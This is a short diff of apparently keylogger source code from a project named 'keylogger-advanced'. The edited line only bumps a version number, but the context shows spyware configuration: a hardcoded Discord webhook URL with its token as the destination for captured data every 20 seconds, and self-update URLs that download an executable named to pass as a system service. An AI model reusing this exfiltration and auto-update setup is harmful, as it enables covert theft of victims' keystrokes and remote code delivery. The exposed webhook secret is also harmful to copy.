@@ -73,7 +73,7 @@ finally:
     # Use the user-provided Discord Webhook URL
     WEBHOOK_URL = "https://discord.com/api/webhooks/1451250056714784820/rcHD8FNgtCzzTrBd8TC_BVeog_rEdUz-wKseDAAbqoJpvXDQ8dC0lDSlvkDXWMOOAgVV"
     SEND_REPORT_EVERY = 20 # Reporting interval in seconds
-    VERSION = "2.0"
+    VERSION = "2.1"
     # Actual GitHub Raw URLs - UPDATED FOR NEW EXE NAME
     VERSION_URL = "https://raw.githubusercontent.com/Pranavfr/keylogger-advanced/main/version.txt" 
     EXE_URL = "https://github.com/Pranavfr/keylogger-advanced/raw/main/StarkCoreServices.exe"
